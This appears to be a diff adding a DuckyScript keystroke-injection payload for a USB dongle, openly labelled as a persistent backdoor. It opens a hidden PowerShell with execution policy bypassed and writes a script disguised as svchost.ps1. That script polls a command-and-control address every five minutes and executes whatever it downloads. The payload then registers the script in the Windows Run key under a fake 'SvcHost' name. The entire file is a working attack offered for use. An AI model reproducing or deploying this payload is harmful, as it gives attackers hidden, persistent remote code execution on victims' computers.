@@ -1,0 +1,39 @@
+# ============================================
+# PERSISTENCE RELAY - DUAL DONGLE
+# ============================================
+# Purpose: Establish persistent backdoor via relay
+# Dongle 1: USB persistence
+# Dongle 2: WiFi beacon to C2
+# Time: 10 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+# DONGLE 1: Create local persistence
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+# Create persistence script
+STRING $p = "$env:APPDATA\Microsoft\Windows\svchost.ps1"
+ENTER
+STRING echo 'while($true){sleep 300;irm http://4.3.2.2:8080/cmd|iex}' > $p
+ENTER
+DELAY 200
+
+# Add to startup
+STRING $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+ENTER
+STRING Set-ItemProperty -Path $reg -Name "SvcHost" -Value "powershell -W H -EP B -File $p"
+ENTER
+DELAY 200
+
+# DONGLE 2: Act as C2 relay
+# (Configured via WiFi, polls C2 server)
+# Beacons every 5 minutes to Dongle 1
+
+STRING exit
+ENTER
